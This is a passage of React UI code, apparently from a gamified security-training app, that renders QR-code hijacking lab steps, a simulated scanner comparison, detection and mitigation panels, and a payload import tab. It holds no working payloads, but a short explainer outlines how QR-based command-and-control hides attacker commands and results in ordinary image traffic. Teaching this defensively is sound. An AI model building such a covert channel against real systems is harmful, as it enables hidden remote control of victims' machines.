                          <div className="p-3 bg-black/40 rounded border border-stone-700">
                            <p className="text-xs text-amber-500 font-bold mb-2">STEP 1: Understand the Attack</p>
                            <div className="p-2 bg-red-950/20 rounded border border-red-900/20 mb-2">
                              <p className="text-xs text-red-400 font-bold mb-1">Real-World Case:</p>
                              <p className="text-xs text-stone-300">{lab.realWorldCase}</p>
                            </div>
                            <p className="text-xs text-stone-400 mb-2">{lab.concept}</p>
                            <Button
                              onClick={() => setLabStep(1)}
                              className="w-full bg-amber-800 hover:bg-amber-700 text-black text-xs min-h-[44px]"
                              data-testid="lab-next-step-1"
                            >
                              Understood - Proceed to QR Generation
                            </Button>
                          </div>
                        </div>
                      )}

                      {labStep === 1 && (
                        <div className="space-y-3" data-testid="lab-step-1">
                          <div className="p-3 bg-black/40 rounded border border-stone-700">
                            <p className="text-xs text-amber-500 font-bold mb-2">STEP 2: Generate QR Codes</p>
                            <p className="text-xs text-stone-400 mb-3">Generate both the legitimate and malicious QR codes to understand how the attack works.</p>
                            
                            <div className="grid grid-cols-2 gap-3">
                              <div className="space-y-2">
                                <p className="text-xs text-teal-400 font-bold">Legitimate QR</p>
                                <p className="text-xs text-stone-500 font-mono break-all">{sim?.safeUrl}</p>
                                <Button
                                  onClick={() => sim && generateLabQR(activeLabId, sim.safeUrl, 'safe')}
                                  disabled={!!labQrResults['safe']}
                                  className="w-full bg-teal-800 hover:bg-teal-700 text-black text-xs min-h-[36px]"
                                  data-testid="lab-gen-safe-qr"
                                >
                                  {labQrResults['safe'] ? 'Generated' : 'Generate Safe QR'}
                                </Button>
                                {labQrResults['safe'] && (
                                  <img src={labQrResults['safe']} alt="Safe QR" className="w-full rounded border border-teal-900/50" />
                                )}
                              </div>
                              <div className="space-y-2">
                                <p className="text-xs text-red-400 font-bold">Malicious QR</p>
                                <p className="text-xs text-stone-500 font-mono break-all">{sim?.maliciousUrl}</p>
                                <Button
                                  onClick={() => sim && generateLabQR(activeLabId, sim.maliciousUrl, 'evil')}
                                  disabled={!!labQrResults['evil']}
                                  className="w-full bg-red-800 hover:bg-red-700 text-white text-xs min-h-[36px]"
                                  data-testid="lab-gen-evil-qr"
                                >
                                  {labQrResults['evil'] ? 'Generated' : 'Generate Attack QR'}
                                </Button>
                                {labQrResults['evil'] && (
                                  <img src={labQrResults['evil']} alt="Attack QR" className="w-full rounded border border-red-900/50" />
                                )}
                              </div>
                            </div>

                            <Button
                              onClick={() => setLabStep(2)}
                              disabled={!labQrResults['safe'] || !labQrResults['evil']}
                              className="w-full mt-3 bg-amber-800 hover:bg-amber-700 text-black text-xs min-h-[44px]"
                              data-testid="lab-next-step-2"
                            >
                              Both QRs Generated - Run Scanner Simulation
                            </Button>
                          </div>
                        </div>
                      )}

                      {labStep === 2 && (
                        <div className="space-y-3" data-testid="lab-step-2">
                          <div className="p-3 bg-black/40 rounded border border-stone-700">
                            <p className="text-xs text-amber-500 font-bold mb-2">STEP 3: Multi-Scanner Simulation</p>
                            <p className="text-xs text-stone-400 mb-3">
                              Watch how different QR scanners interpret the same hijacked QR code differently. This is why the attack works.
                            </p>

                            {labScanResults.length === 0 && !labSimulating && (
                              <Button
                                onClick={() => simulateLabScan(activeLabId)}
                                className="w-full bg-purple-800 hover:bg-purple-700 text-white text-xs min-h-[44px]"
                                data-testid="lab-run-scan"
                              >
                                <Zap className="w-3 h-3 mr-2" />
                                Run Multi-Scanner Attack Simulation
                              </Button>
                            )}

                            {labSimulating && (
                              <div className="flex items-center gap-2 p-3 bg-purple-950/30 rounded border border-purple-800/50">
                                <Loader2 className="w-4 h-4 animate-spin text-purple-400" />
                                <span className="text-xs text-purple-400">Simulating scanner responses...</span>
                              </div>
                            )}

                            {labScanResults.length > 0 && (
                              <div className="space-y-2 mt-2">
                                {labScanResults.map((scan, i) => (
                                  <div 
                                    key={i}
                                    className={`p-2 rounded border text-xs font-mono ${
                                      scan.isMalicious 
                                        ? 'bg-red-950/30 border-red-800/50' 
                                        : 'bg-teal-950/30 border-teal-800/50'
                                    }`}
                                    data-testid={`lab-scan-result-${i}`}
                                  >
                                    <div className="flex items-center justify-between mb-1">
                                      <span className={scan.isMalicious ? 'text-red-400' : 'text-teal-400'}>
                                        {scan.scanner}
                                      </span>
                                      <span className={`px-1.5 py-0.5 rounded text-[10px] ${
                                        scan.isMalicious ? 'bg-red-900 text-red-300' : 'bg-teal-900 text-teal-300'
                                      }`}>
                                        {scan.isMalicious ? 'HIJACKED' : 'SAFE'}
                                      </span>
                                    </div>
                                    <p className={`break-all ${scan.isMalicious ? 'text-red-300' : 'text-teal-300'}`}>
                                      {scan.result}
                                    </p>
                                  </div>
                                ))}
                              </div>
                            )}

                            {labScanResults.length > 0 && !labSimulating && (
                              <Button
                                onClick={() => setLabStep(3)}
                                className="w-full mt-3 bg-amber-800 hover:bg-amber-700 text-black text-xs min-h-[44px]"
                                data-testid="lab-next-step-3"
                              >
                                Analyze Results - View Detection & Defense
                              </Button>
                            )}
                          </div>
                        </div>
                      )}

                      {labStep === 3 && (
                        <div className="space-y-3" data-testid="lab-step-3">
                          <div className="p-3 bg-black/40 rounded border border-stone-700">
                            <p className="text-xs text-amber-500 font-bold mb-2">STEP 4: Detection & Mitigation</p>
                            
                            <div className="grid grid-cols-1 gap-3 mb-3">
                              <div className="p-2 bg-blue-950/20 rounded border border-blue-900/30">
                                <p className="text-xs text-blue-400 font-bold mb-1">How to Detect This Attack:</p>
                                <p className="text-xs text-stone-300">{lab.detection}</p>
                              </div>
                              <div className="p-2 bg-teal-950/20 rounded border border-teal-900/30">
                                <p className="text-xs text-teal-400 font-bold mb-1">Mitigation Strategy:</p>
                                <p className="text-xs text-stone-300">{lab.mitigation}</p>
                              </div>
                            </div>

                            <div className="p-2 bg-amber-950/20 rounded border border-amber-900/30 mb-3">
                              <p className="text-xs text-amber-400 font-bold mb-1">Key Takeaways:</p>
                              <ul className="text-xs text-stone-300 space-y-1 list-disc list-inside">
                                {lab.steps.map((step, i) => (
                                  <li key={i} className="flex items-start gap-1">
                                    <Check className="w-3 h-3 text-amber-500 mt-0.5 shrink-0" />
                                    <span>{step}</span>
                                  </li>
                                ))}
                              </ul>
                            </div>

                            {labCompleted.has(activeLabId) ? (
                              <div className="p-3 bg-amber-950/30 rounded border border-amber-700 text-center">
                                <p className="text-xs text-amber-400 font-bold">Lab Already Completed</p>
                              </div>
                            ) : (
                              <Button
                                onClick={() => completeLab(activeLabId)}
                                className="w-full bg-amber-600 hover:bg-amber-500 text-black font-bold text-sm min-h-[44px]"
                                data-testid="lab-complete-btn"
                              >
                                <Trophy className="w-4 h-4 mr-2" />
                                Complete Lab (+{xpReward} XP)
                              </Button>
                            )}
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })() : (
                  <div className="space-y-2">
                    {QR_INCEPTION_LABS.map((lab) => {
                      const isComplete = labCompleted.has(lab.id);
                      const xp = lab.difficulty === 'beginner' ? 40 : lab.difficulty === 'intermediate' ? 65 : 100;
                      return (
                        <div 
                          key={lab.id}
                          className={`rounded border transition-all ${
                            isComplete 
                              ? 'bg-amber-950/20 border-amber-800/50' 
                              : 'bg-black/30 border-amber-900/20 hover:border-amber-700/50'
                          }`}
                          data-testid={`lab-card-${lab.id}`}
                        >
                          <div className="p-3">
                            <div className="flex items-center justify-between mb-1">
                              <div className="flex items-center gap-2">
                                {isComplete && <Check className="w-3.5 h-3.5 text-amber-500" />}
                                <span className="text-sm text-amber-400 font-bold">{lab.title}</span>
                              </div>
                              <div className="flex items-center gap-2">
                                <span className="text-xs text-stone-500">{xp} XP</span>
                                <span className={`text-xs px-1.5 py-0.5 rounded ${
                                  lab.difficulty === 'beginner' ? 'bg-teal-950 text-teal-400' :
                                  lab.difficulty === 'intermediate' ? 'bg-yellow-950 text-yellow-400' :
                                  'bg-red-950 text-red-400'
                                }`}>
                                  {lab.difficulty}
                                </span>
                              </div>
                            </div>
                            <p className="text-xs text-stone-400 mb-2">{lab.concept}</p>
                            <Button
                              onClick={() => startLab(lab.id)}
                              variant={isComplete ? 'outline' : 'default'}
                              className={`w-full text-xs min-h-[36px] ${
                                isComplete 
                                  ? 'border-amber-800/50 text-amber-500 hover:bg-amber-950/30' 
                                  : 'bg-amber-800 hover:bg-amber-700 text-black'
                              }`}
                              data-testid={`lab-start-${lab.id}`}
                            >
                              {isComplete ? 'Review Lab' : 'Start Lab Exercise'}
                            </Button>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                )}

                {!activeLabId && (
                  <div className="p-3 bg-stone-900/30 rounded border border-stone-800">
                    <h4 className="text-amber-500 font-bold text-sm mb-2">Challenge Modes</h4>
                    <div className="grid gap-2">
                      {QR_CHALLENGE_MODES.map((mode) => (
                        <div key={mode.id} className="p-2 bg-black/30 rounded border border-stone-700/50">
                          <div className="flex items-center gap-2 mb-1">
                            <span>{mode.icon}</span>
                            <span className="text-xs text-teal-400 font-bold">{mode.name}</span>
                            <span className="text-xs text-stone-600">({mode.technique})</span>
                          </div>
                          <p className="text-xs text-stone-400">{mode.description}</p>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* How It Works */}
            <div className="p-3 bg-black/30 rounded border border-stone-800">
              <p className="text-xs text-stone-500 font-bold mb-2">HOW QR C2 WORKS</p>
              <ol className="text-xs text-stone-500 space-y-1 list-decimal list-inside">
                <li>Attacker encodes command → QR code (command.png)</li>
                <li>Target polls server, downloads & decodes QR</li>
                <li>Command executes, result encoded → QR</li>
                <li>Result QR uploaded, attacker decodes response</li>
                <li>All traffic appears as normal image downloads</li>
              </ol>
              <p className="text-xs text-red-400 mt-2 italic">
                * In NEXUS, this is simulated for educational purposes. No real systems are targeted.
              </p>
            </div>
          </TabsContent>

          <TabsContent value="import" className="space-y-4 mt-4">
            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700">Base64 Encoded Payload</label>
              <Input
                value={importCode}
                onChange={(e) => setImportCode(e.target.value)}
                className="bg-black/50 border-amber-900/30 text-amber-500 font-mono"
                placeholder="Paste encoded QR data here..."
              />
            </div>

            <Button 
              onClick={handleImport} 
              disabled={loading || !importCode}
              className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
            >
              <Upload className="w-4 h-4 mr-2" />
              {loading ? 'DECODING...' : 'DECODE & IMPORT'}
            </Button>

            {importResult && (
              <div className={`p-3 rounded border font-mono text-sm ${
                importResult.startsWith('SUCCESS') 
                  ? 'bg-green-950/30 border-green-800/50 text-green-500' 
                  : importResult.startsWith('ERROR')
                    ? 'bg-red-950/30 border-red-800/50 text-red-500'
                    : 'bg-amber-950/30 border-amber-800/50 text-amber-500'
              }`}>
                {importResult}
              </div>
            )}
          </TabsContent>
        </Tabs>
      </DialogContent>
    </Dialog>
  );
};
